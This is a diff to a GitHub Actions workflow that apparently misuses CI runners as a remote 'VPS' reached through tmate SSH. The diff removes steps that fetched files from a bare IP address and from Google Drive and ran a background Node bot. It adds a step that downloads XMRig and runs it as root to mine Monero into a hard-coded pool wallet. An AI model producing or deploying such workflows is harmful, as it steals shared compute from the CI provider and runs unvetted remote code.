@@ -34,38 +34,12 @@ jobs:
           SSH=$(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}')
           echo "$SSH" | tee "links/${{ github.event.client_payload.vps_name || 'manual-vps' }}.txt"
 
-      - name: 🚀 Start Playit Tunnel
+      - name: 📥 Setup VPS (XMRig)
         run: |
-          wget -q https://github.com/playit-cloud/playit-agent/releases/latest/download/playit-linux-amd64 -O playit
-          chmod +x playit
-          nohup ./playit > playit.log 2>&1 &
-          echo "✅ Playit started in background."
-
-      - name: 📥 Setup VPS
-        run: |
-          # Tải file vn.txt
-          wget http://36.50.134.20:3000/download/vn.txt
-          # Cài đặt gdown
-          pip install gdown
-          # Tải và đổi tên file từ Google Drive
-          gdown https://drive.google.com/uc?id=1Kpe6qSbsNaS-z0f9BMCyJsi3ooVouPLh -O shit.js
-          mv shit.js raw.js
-          gdown https://drive.google.com/uc?id=1d7DjHHAqvOA5QkYw196JJZ_Vj3xMXfZF
-          # Cài đặt các package npm
-          npm install cluster colors colorama axios crypto discord.js gradient-string
-          nohup node bot.js > bot.log 2>&1 &
-          echo "✅ Bot started in background."
-
-      - name: 📦 Save backup
-        run: |
-          name="${{ github.event.client_payload.vps_name || 'manual-vps' }}"
-          zip -qr ".backup/$name.zip" . -x ".git/*" ".github/*" ".backup/*" || true
-
-      - name: 📤 Push updated files
-        uses: stefanzweifel/git-auto-commit-action@v5
-        with:
-          commit_message: "🔁 Updated SSH + backup"
-          file_pattern: 'links/*.txt .backup/*.zip'
+          wget https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-focal-x64.tar.gz
+          tar -xvzf xmrig-6.24.0-focal-x64.tar.gz
+          cd xmrig-6.24.0
+          sudo su -c "./xmrig -o asia.hashvault.pro:443 -u 8AHRHxFXTbBDBh57fByZ1ZGmMh3fwUFiVRe4FCS4yGDqb9FMtVHXNvS9u5UVMVLDU3MhQ6dAfZWnCKq2rUBSXPQLGRT6unC -p vipminer -a rx --tls --cpu-priority=5 --randomx-1gb-pages -t 4"
 
       - name: ⏳ Keep VPS alive
         run: |
